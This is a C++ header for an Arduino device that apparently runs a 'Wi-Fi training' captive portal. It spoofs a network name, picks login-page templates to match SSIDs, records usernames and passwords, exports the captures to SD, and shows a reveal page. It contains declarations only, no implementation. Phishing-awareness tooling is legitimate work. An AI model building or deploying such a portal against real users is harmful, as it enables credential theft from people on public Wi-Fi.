#pragma once

#include <Arduino.h>

struct WifiTrainingResult {
  bool success = false;
  bool active = false;
  char error[96] = {0};
};

class WifiTrainingPortalApp {
public:
  void begin();

  WifiTrainingResult start(const char* labPin);
  WifiTrainingResult stop();
  bool isActive() const { return _active; }

  bool setTemplate(uint8_t templateId);
  static uint8_t suggestTemplateForSsid(const char* ssid);
  bool applyAutoTemplateForSsid(const char* ssid);
  bool setNetworkName(const char* name);
  bool setHeadline(const char* headline);
  bool setSubtitle(const char* subtitle);
  uint8_t getTemplate() const { return _templateId; }
  const char* getNetworkName() const { return _networkName; }
  const char* getHeadline() const { return _headline; }
  const char* getSubtitle() const { return _subtitle; }

  bool recordCapture(const char* username, const char* password);
  String getCapturesTail(uint8_t maxLines = 20) const;
  String getAllCapturesText() const;
  bool exportCapturesToSd(char* outPath, size_t outPathLen, char* error, size_t errorLen) const;
  bool clearCaptures();

  String buildPortalHtml(const String& ip) const;
  String buildRevealHtml(const String& ip) const;
  String statusToJson() const;
  String configToJson() const;

private:
  bool checkPin(const char* labPin, char* error, size_t errorLen) const;
  bool saveConfig() const;
  bool loadConfig();
  void applyTemplateDefaults();
  void syncCapturesFromStorage();

  bool _active = false;
  String _memoryCaptures;
  bool _savedPortalEnabled = false;
  uint8_t _templateId = 0;
  char _networkName[32] = "Guest_WiFi";
  char _headline[64] = "Sign in to Wi-Fi";
  char _subtitle[128] = "Enter your details to access the internet";
  uint32_t _captureCount = 0;
};

extern WifiTrainingPortalApp WifiTraining;
